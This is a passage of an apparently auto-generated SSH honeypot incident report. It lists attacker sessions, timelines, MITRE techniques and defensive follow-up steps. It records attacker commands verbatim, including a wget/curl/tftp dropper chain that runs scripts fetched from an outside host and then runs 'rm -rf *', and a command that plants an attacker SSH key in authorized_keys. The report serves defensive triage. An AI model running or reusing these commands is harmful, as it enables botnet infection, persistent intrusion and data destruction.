| `2026-10-02 04:01:04` | `cowrie.command.input` |
| `2026-10-02 04:01:04` | `cowrie.command.input` |
| `2026-10-02 04:01:04` | `cowrie.command.input` |
| `2026-10-02 04:01:04` | `cowrie.command.input` |
| `2026-10-02 04:01:04` | `cowrie.command.success` |
| `2026-10-02 04:01:04` | `cowrie.command.input` |
| `2026-10-02 04:01:04` | `cowrie.command.input` |
| `2026-10-02 04:01:04` | `cowrie.command.input` |
| `2026-10-02 04:01:04` | `cowrie.command.input` |
| … | _5 more event(s) — see ir_cases.json_ |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]77` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]77` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

```
⚠️  MALWARE ANALYSIS — HIGH SEVERITY SAMPLE DETECTED
   File  : 07c0a0af63dde8dc2e36dc58b630dcad6563263e992877aaa704530afb8a5656  (ELF Binary (Linux executable))
   SHA256: 07c0a0af63dde8dc2e36dc58b630dcad6563263e992877aa...
   Score : 86/100  |  VT: 40/75
   ↳ Download via wget: wget
   ↳ Download via curl: curl
   ↳ Execution from /tmp: /tmp/bot
   ↳ chmod +x (make executable): chmod +x
```

### 🔴 HIGH · IR-9e9e751b8dfb

| Field | Detail |
|---|---|
| **Source IP** | `94.154.43[.]69` |
| **First Seen** | 2026-10-02 04:32 |
| **Last Seen** | 2026-10-02 04:32 |
| **Session Duration** | 17s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `sh, cd /tmp || cd /run || cd /mnt || cd /root || cd /; wget hxxp://213.232.114[.]14/handshakebins.sh; busybox wget hxxp://213.232.114[.]14/handshakebins.sh; curl -o handshakebins.sh hxxp://213.232.114[.]14/handshakebins.sh; chmod 777 handshakebins.sh; sh handshakebins.sh; tftp 213.232.114[.]14 -c get tftp1.sh; chmod 777 tftp1.sh; sh tftp1.sh; tftp -r tftp2.sh -g 213.232.114[.]14; chmod 777 tftp2.sh; sh tftp2.sh; rm -rf handshakebins.sh tftp1.sh tftp2.sh; rm -rf *` |
| **Download Attempts** | hxxp://213.232.114[.]14/handshakebins.sh, hxxp://213.232.114[.]14/handshakebins.sh, hxxp://213.232.114[.]14/handshakebins.sh |
| **Malware Analysis** | 07c0a0af63dde8dc2e36dc58b630dcad6563263e992877aaa704530afb8a5656 (HIGH) |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1105 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-02 04:32:19` | `cowrie.session.connect` |
| `2026-10-02 04:32:19` | `cowrie.login.success` |
| `2026-10-02 04:32:20` | `cowrie.session.params` |
| `2026-10-02 04:32:21` | `cowrie.command.input` |
| `2026-10-02 04:32:21` | `cowrie.command.input` |
| `2026-10-02 04:32:22` | `cowrie.session.file_download` |
| `2026-10-02 04:32:22` | `cowrie.session.file_download` |
| `2026-10-02 04:32:22` | `cowrie.session.file_download` |
| `2026-10-02 04:32:22` | `cowrie.session.file_download` |
| `2026-10-02 04:32:22` | `cowrie.session.file_download.failed` |
| `2026-10-02 04:32:23` | `cowrie.session.file_download` |
| `2026-10-02 04:32:23` | `cowrie.session.file_download` |
| `2026-10-02 04:32:36` | `cowrie.log.closed` |
| `2026-10-02 04:32:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `94.154.43[.]69` to AbuseIPDB if not already reported
- [ ] Block `94.154.43[.]69` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Review VT report: hxxps://www.virustotal.com/gui/file/07c0a0af63dde8dc2e36dc58b630dcad6563263e992877aaa704530afb8a5656
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-02e270e516a0

| Field | Detail |
|---|---|
| **Source IP** | `34.77.205[.]72` |
| **First Seen** | 2026-10-02 04:38 |
| **Last Seen** | 2026-10-02 04:38 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-02 04:38:49` | `cowrie.session.connect` |
| `2026-10-02 04:38:49` | `cowrie.client.version` |
| `2026-10-02 04:38:50` | `cowrie.client.kex` |
| `2026-10-02 04:38:52` | `cowrie.login.success` |
| `2026-10-02 04:38:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `34.77.205[.]72` to AbuseIPDB if not already reported
- [ ] Block `34.77.205[.]72` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3d6babac22b5

| Field | Detail |
|---|---|
| **Source IP** | `45.79.207[.]181` |
| **First Seen** | 2026-10-02 04:42 |
| **Last Seen** | 2026-10-02 04:42 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `Accept: */*, Accept-Encoding: gzip, User-Agent: Mozilla/5.0 zgrab/0.x` |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-02 04:42:28` | `cowrie.session.connect` |
| `2026-10-02 04:42:28` | `cowrie.login.success` |
| `2026-10-02 04:42:29` | `cowrie.session.params` |
| `2026-10-02 04:42:29` | `cowrie.command.input` |
| `2026-10-02 04:42:29` | `cowrie.command.failed` |
| `2026-10-02 04:42:29` | `cowrie.command.input` |
| `2026-10-02 04:42:29` | `cowrie.command.failed` |
| `2026-10-02 04:42:29` | `cowrie.command.input` |
| `2026-10-02 04:42:29` | `cowrie.command.failed` |
| `2026-10-02 04:42:29` | `cowrie.command.input` |
| `2026-10-02 04:42:30` | `cowrie.log.closed` |
| `2026-10-02 04:42:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.79.207[.]181` to AbuseIPDB if not already reported
- [ ] Block `45.79.207[.]181` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-be77fefe15f3

| Field | Detail |
|---|---|
| **Source IP** | `20.55.45[.]217` |
| **First Seen** | 2026-10-02 04:46 |
| **Last Seen** | 2026-10-02 04:46 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-02 04:46:28` | `cowrie.session.connect` |
| `2026-10-02 04:46:28` | `cowrie.client.version` |
| `2026-10-02 04:46:28` | `cowrie.client.kex` |
| `2026-10-02 04:46:28` | `cowrie.login.success` |
| `2026-10-02 04:46:29` | `cowrie.session.params` |
| `2026-10-02 04:46:29` | `cowrie.command.input` |
| `2026-10-02 04:46:29` | `cowrie.command.failed` |
| `2026-10-02 04:46:29` | `cowrie.log.closed` |
| `2026-10-02 04:46:29` | `cowrie.session.params` |
| `2026-10-02 04:46:29` | `cowrie.command.input` |
| `2026-10-02 04:46:29` | `cowrie.session.file_download` |
| `2026-10-02 04:46:29` | `cowrie.log.closed` |
| `2026-10-02 04:46:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `20.55.45[.]217` to AbuseIPDB if not already reported
- [ ] Block `20.55.45[.]217` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6a7b57f03379

| Field | Detail |
|---|---|
| **Source IP** | `20.55.45[.]217` |
| **First Seen** | 2026-10-02 04:46 |
| **Last Seen** | 2026-10-02 04:46 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-02 04:46:29` | `cowrie.session.connect` |
| `2026-10-02 04:46:29` | `cowrie.client.version` |
| `2026-10-02 04:46:29` | `cowrie.client.kex` |
| `2026-10-02 04:46:29` | `cowrie.login.success` |
| `2026-10-02 04:46:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `20.55.45[.]217` to AbuseIPDB if not already reported
- [ ] Block `20.55.45[.]217` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2b727fd5b5c8

| Field | Detail |
|---|---|
| **Source IP** | `94.154.43[.]69` |
| **First Seen** | 2026-10-02 04:47 |
| **Last Seen** | 2026-10-02 04:47 |
| **Session Duration** | 17s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `sh, cd /tmp || cd /run || cd /mnt || cd /root || cd /; wget hxxp://213.232.114[.]14/nokillbins/handshakebins.sh; busybox wget hxxp://213.232.114[.]14/nokillbins/handshakebins.sh; curl -o handshakebins.sh hxxp://213.232.114[.]14/nokillbins/handshakebins.sh; chmod 777 handshakebins.sh; sh handshakebins.sh; tftp 213.232.114[.]14 -c get tftp1.sh; chmod 777 tftp1.sh; sh tftp1.sh; tftp -r tftp2.sh -g 213.232.114[.]14; chmod 777 tftp2.sh; sh tftp2.sh; rm -rf handshakebins.sh tftp1.sh tftp2.sh; rm -rf *` |
| **Download Attempts** | hxxp://213.232.114[.]14/nokillbins/handshakebins.sh, hxxp://213.232.114[.]14/nokillbins/handshakebins.sh, hxxp://213.232.114[.]14/nokillbins/handshakebins.sh |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1105 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-02 04:47:22` | `cowrie.session.connect` |
| `2026-10-02 04:47:23` | `cowrie.login.success` |
| `2026-10-02 04:47:23` | `cowrie.session.params` |
| `2026-10-02 04:47:25` | `cowrie.command.input` |
| `2026-10-02 04:47:25` | `cowrie.command.input` |
| `2026-10-02 04:47:25` | `cowrie.session.file_download` |
| `2026-10-02 04:47:25` | `cowrie.session.file_download` |
| `2026-10-02 04:47:25` | `cowrie.session.file_download` |
| `2026-10-02 04:47:25` | `cowrie.session.file_download` |
| `2026-10-02 04:47:25` | `cowrie.session.file_download.failed` |
| `2026-10-02 04:47:27` | `cowrie.session.file_download` |
| `2026-10-02 04:47:27` | `cowrie.session.file_download` |
| `2026-10-02 04:47:40` | `cowrie.log.closed` |
| `2026-10-02 04:47:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `94.154.43[.]69` to AbuseIPDB if not already reported
- [ ] Block `94.154.43[.]69` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2c2bf10b7862

| Field | Detail |
|---|---|
| **Source IP** | `118.196.68[.]35` |
| **First Seen** | 2026-10-02 04:50 |
| **Last Seen** | 2026-10-02 04:50 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-02 04:50:44` | `cowrie.session.connect` |
| `2026-10-02 04:50:44` | `cowrie.client.version` |
| `2026-10-02 04:50:44` | `cowrie.client.kex` |
| `2026-10-02 04:50:45` | `cowrie.login.success` |
| `2026-10-02 04:50:46` | `cowrie.session.params` |
| `2026-10-02 04:50:46` | `cowrie.command.input` |
| `2026-10-02 04:50:46` | `cowrie.command.failed` |
| `2026-10-02 04:50:47` | `cowrie.log.closed` |
| `2026-10-02 04:50:47` | `cowrie.session.params` |
| `2026-10-02 04:50:47` | `cowrie.command.input` |
| `2026-10-02 04:50:48` | `cowrie.session.file_download` |
| `2026-10-02 04:50:48` | `cowrie.log.closed` |
| `2026-10-02 04:50:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `118.196.68[.]35` to AbuseIPDB if not already reported
- [ ] Block `118.196.68[.]35` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c3fc3b192d30

| Field | Detail |
|---|---|
| **Source IP** | `118.196.68[.]35` |
| **First Seen** | 2026-10-02 04:50 |
| **Last Seen** | 2026-10-02 04:50 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-02 04:50:48` | `cowrie.session.connect` |
| `2026-10-02 04:50:48` | `cowrie.client.version` |
| `2026-10-02 04:50:48` | `cowrie.client.kex` |
| `2026-10-02 04:50:49` | `cowrie.login.success` |
| `2026-10-02 04:50:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `118.196.68[.]35` to AbuseIPDB if not already reported
- [ ] Block `118.196.68[.]35` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-165af93e57df

| Field | Detail |
|---|---|
| **Source IP** | `176.53.159[.]196` |
| **First Seen** | 2026-10-02 04:51 |
| **Last Seen** | 2026-10-02 04:51 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-02 04:51:14` | `cowrie.session.connect` |
| `2026-10-02 04:51:14` | `cowrie.client.version` |
| `2026-10-02 04:51:14` | `cowrie.client.kex` |
| `2026-10-02 04:51:15` | `cowrie.login.success` |
| `2026-10-02 04:51:15` | `cowrie.direct-tcpip.request` |
| `2026-10-02 04:51:15` | `cowrie.direct-tcpip.data` |
| `2026-10-02 04:51:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.53.159[.]196` to AbuseIPDB if not already reported
- [ ] Block `176.53.159[.]196` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fab07dc0dd4b

| Field | Detail |
|---|---|
| **Source IP** | `120.26.61[.]13` |
| **First Seen** | 2026-10-02 05:02 |
| **Last Seen** | 2026-10-02 05:07 |
| **Session Duration** | 301s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-02 05:02:01` | `cowrie.session.connect` |
| `2026-10-02 05:02:01` | `cowrie.client.version` |
| `2026-10-02 05:02:02` | `cowrie.client.kex` |
| `2026-10-02 05:02:03` | `cowrie.login.success` |
| `2026-10-02 05:02:04` | `cowrie.session.params` |
| `2026-10-02 05:02:04` | `cowrie.command.input` |
| `2026-10-02 05:07:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `120.26.61[.]13` to AbuseIPDB if not already reported
- [ ] Block `120.26.61[.]13` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-297416acb08a

| Field | Detail |
|---|---|
| **Source IP** | `45.79.149[.]50` |
| **First Seen** | 2026-10-02 05:12 |
| **Last Seen** | 2026-10-02 05:12 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 13_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0[.]0 Safari/537.36, Accept: */*, Accept-Encoding: gzip` |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-02 05:12:29` | `cowrie.session.connect` |
| `2026-10-02 05:12:29` | `cowrie.login.success` |
| `2026-10-02 05:12:30` | `cowrie.session.params` |
| `2026-10-02 05:12:30` | `cowrie.command.input` |
| `2026-10-02 05:12:30` | `cowrie.command.input` |
| `2026-10-02 05:12:30` | `cowrie.command.failed` |
| `2026-10-02 05:12:30` | `cowrie.command.input` |
| `2026-10-02 05:12:30` | `cowrie.command.failed` |
| `2026-10-02 05:12:30` | `cowrie.command.input` |
| `2026-10-02 05:12:30` | `cowrie.log.closed` |
| `2026-10-02 05:12:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.79.149[.]50` to AbuseIPDB if not already reported
- [ ] Block `45.79.149[.]50` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1388e2d5a686

| Field | Detail |
|---|---|
| **Source IP** | `139.255.254[.]163` |
| **First Seen** | 2026-10-02 05:13 |
| **Last Seen** | 2026-10-02 05:13 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-02 05:13:43` | `cowrie.session.connect` |
| `2026-10-02 05:13:43` | `cowrie.client.version` |
| `2026-10-02 05:13:43` | `cowrie.client.kex` |
| `2026-10-02 05:13:44` | `cowrie.login.success` |
| `2026-10-02 05:13:45` | `cowrie.session.params` |
| `2026-10-02 05:13:45` | `cowrie.command.input` |
| `2026-10-02 05:13:45` | `cowrie.command.failed` |
| `2026-10-02 05:13:46` | `cowrie.log.closed` |
| `2026-10-02 05:13:46` | `cowrie.session.params` |
| `2026-10-02 05:13:46` | `cowrie.command.input` |
| `2026-10-02 05:13:47` | `cowrie.session.file_download` |
| `2026-10-02 05:13:47` | `cowrie.log.closed` |
| `2026-10-02 05:13:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `139.255.254[.]163` to AbuseIPDB if not already reported
- [ ] Block `139.255.254[.]163` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a725129768e0

| Field | Detail |
|---|---|
| **Source IP** | `139.255.254[.]163` |
| **First Seen** | 2026-10-02 05:13 |
| **Last Seen** | 2026-10-02 05:13 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-02 05:13:47` | `cowrie.session.connect` |
| `2026-10-02 05:13:47` | `cowrie.client.version` |
| `2026-10-02 05:13:47` | `cowrie.client.kex` |
| `2026-10-02 05:13:48` | `cowrie.login.success` |
| `2026-10-02 05:13:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `139.255.254[.]163` to AbuseIPDB if not already reported
- [ ] Block `139.255.254[.]163` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### Additional priority cases (162) — compact view

| Case | Severity | Source IP | First Seen | Auth | Cmds | DL | TTPs |
|---|---|---|---|---|---|---|---|
| IR-53915ee7ab43 | HIGH | `132.248.170[.]105` | 2026-10-02 05:15 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-af404e30a62d | HIGH | `132.248.170[.]105` | 2026-10-02 05:15 | Y | 0 | 0 | `T1078 · T1592` |
| IR-ef66d4f17c09 | HIGH | `159.65.5[.]51` | 2026-10-02 05:17 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-5e19656aaa74 | HIGH | `159.65.5[.]51` | 2026-10-02 05:17 | Y | 0 | 0 | `T1078 · T1592` |
| IR-a83ff4373f24 | HIGH | `36.93.249[.]106` | 2026-10-02 05:18 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-7cf4109b14b7 | HIGH | `36.93.249[.]106` | 2026-10-02 05:18 | Y | 0 | 0 | `T1078 · T1592` |
| IR-aad990e2845b | HIGH | `138.226.239[.]234` | 2026-10-02 05:18 | Y | 0 | 0 | `T1078 · T1592` |
| IR-6dd539eb961c | HIGH | `165.154.156[.]67` | 2026-10-02 05:19 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-52560d2caab4 | HIGH | `165.154.156[.]67` | 2026-10-02 05:19 | Y | 0 | 0 | `T1078 · T1592` |
| IR-77c6c0bef1b8 | HIGH | `81.28.167[.]30` | 2026-10-02 05:29 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-a9c916b59ca8 | HIGH | `81.28.167[.]30` | 2026-10-02 05:29 | Y | 0 | 0 | `T1078 · T1592` |
| IR-87f21ef69207 | HIGH | `45.79.211[.]97` | 2026-10-02 05:39 | Y | 3 | 0 | `T1078` |
| IR-9341744b03f1 | HIGH | `172.239.71[.]245` | 2026-10-02 05:44 | Y | 3 | 0 | `T1078` |
| IR-066164adb957 | HIGH | `92.118.39[.]77` | 2026-10-02 06:00 | Y | 10 | 0 | `T1059.004 · T1078 · T1083` |
| IR-e94f8e256999 | HIGH | `77.90.185[.]17` | 2026-10-02 06:12 | Y | 0 | 0 | `T1078 · T1592` |
| IR-03916211b8d2 | HIGH | `138.226.239[.]233` | 2026-10-02 06:16 | Y | 0 | 0 | `T1078 · T1592` |
| IR-291329cdadad | HIGH | `176.53.159[.]196` | 2026-10-02 06:21 | Y | 0 | 0 | `T1078 · T1592` |
| IR-8d2db34875e2 | HIGH | `24.46.242[.]125` | 2026-10-02 06:34 | Y | 1 | 0 | `T1078 · T1592` |
| IR-a4ef2faec5da | HIGH | `34.62.39[.]253` | 2026-10-02 06:44 | Y | 2 | 0 | `T1078` |
| IR-5cdc5e63d094 | HIGH | `34.62.39[.]253` | 2026-10-02 06:44 | Y | 1 | 0 | `T1078` |
| IR-b26106d2d199 | HIGH | `34.62.39[.]253` | 2026-10-02 06:44 | Y | 0 | 0 | `T1078` |
| IR-d05906f497d6 | HIGH | `94.154.43[.]69` | 2026-10-02 06:48 | Y | 2 | 6 | `T1059.004 · T1078 · T1105` |
| IR-2f18a12f2605 | HIGH | `77.239.124[.]42` | 2026-10-02 06:56 | Y | 0 | 0 | `T1078 · T1592` |
| IR-ed4b370323a1 | HIGH | `94.154.43[.]69` | 2026-10-02 07:03 | Y | 2 | 6 | `T1059.004 · T1078 · T1105` |
| IR-53ca144fe28f | HIGH | `207.175.190[.]81` | 2026-10-02 07:26 | Y | 2 | 0 | `T1078` |
| IR-bd02aa3f304d | HIGH | `207.175.190[.]81` | 2026-10-02 07:26 | Y | 1 | 0 | `T1078` |
| IR-89b03d98e294 | HIGH | `207.175.190[.]81` | 2026-10-02 07:27 | Y | 0 | 0 | `T1078` |
| IR-b4dd3817059c | HIGH | `119.96.158[.]87` | 2026-10-02 07:29 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-e18747f78720 | HIGH | `119.96.158[.]87` | 2026-10-02 07:29 | Y | 0 | 0 | `T1078 · T1592` |
| IR-8f280a707baf | HIGH | `58.222.244[.]226` | 2026-10-02 07:34 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-274f8f67f258 | HIGH | `58.222.244[.]226` | 2026-10-02 07:34 | Y | 0 | 0 | `T1078 · T1592` |
| IR-9c9e7e4dec43 | HIGH | `157.230.59[.]111` | 2026-10-02 07:34 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-6e5a5fa0e316 | HIGH | `157.230.59[.]111` | 2026-10-02 07:34 | Y | 0 | 0 | `T1078 · T1592` |
| IR-1ae976f29339 | HIGH | `193.112.192[.]91` | 2026-10-02 07:35 | Y | 1 | 0 | `T1078 · T1592` |
| IR-01d75b8da48a | HIGH | `118.145.104[.]37` | 2026-10-02 07:53 | Y | 0 | 0 | `T1078 · T1592` |
| IR-624d08b968d9 | HIGH | `130.12.180[.]51` | 2026-10-02 07:54 | Y | 1 | 2 | `T1021.004 · T1059.004 · T1078` |
| IR-44c659461d08 | HIGH | `34.52.250[.]174` | 2026-10-02 08:00 | Y | 2 | 0 | `T1078` |
| IR-56549da5cfa9 | HIGH | `34.52.250[.]174` | 2026-10-02 08:00 | Y | 1 | 0 | `T1078` |
| IR-8818b169e86c | HIGH | `34.52.250[.]174` | 2026-10-02 08:00 | Y | 0 | 0 | `T1078` |
| IR-424a3ac29058 | HIGH | `94.154.43[.]69` | 2026-10-02 08:02 | Y | 2 | 6 | `T1059.004 · T1078 · T1105` |
| IR-e24e0bb77d13 | HIGH | `101.227.203[.]162` | 2026-10-02 08:05 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-5da802205306 | HIGH | `101.227.203[.]162` | 2026-10-02 08:05 | Y | 0 | 0 | `T1078 · T1592` |
| IR-2fc37039ee8b | HIGH | `43.133.61[.]254` | 2026-10-02 08:08 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-ddee3ee3e7c3 | HIGH | `43.133.61[.]254` | 2026-10-02 08:08 | Y | 0 | 0 | `T1078 · T1592` |
| IR-4ca1b92a92de | HIGH | `94.154.43[.]69` | 2026-10-02 08:15 | Y | 2 | 6 | `T1059.004 · T1078 · T1105` |
| IR-e55a6cc8c68e | HIGH | `109.160.32[.]163` | 2026-10-02 08:19 | Y | 1 | 0 | `T1078 · T1592` |
| IR-9103d083e45d | HIGH | `173.244.60[.]241` | 2026-10-02 08:20 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-519e717438da | HIGH | `173.244.60[.]241` | 2026-10-02 08:20 | Y | 0 | 0 | `T1078 · T1592` |
| IR-c1b24a0dc982 | HIGH | `47.250.120[.]189` | 2026-10-02 08:21 | Y | 0 | 0 | `T1078 · T1592` |
| IR-a41c5a3058d2 | HIGH | `130.12.180[.]51` | 2026-10-02 08:21 | Y | 1 | 2 | `T1021.004 · T1059.004 · T1078` |
| IR-b87d4f517575 | HIGH | `103.190.7[.]203` | 2026-10-02 08:24 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
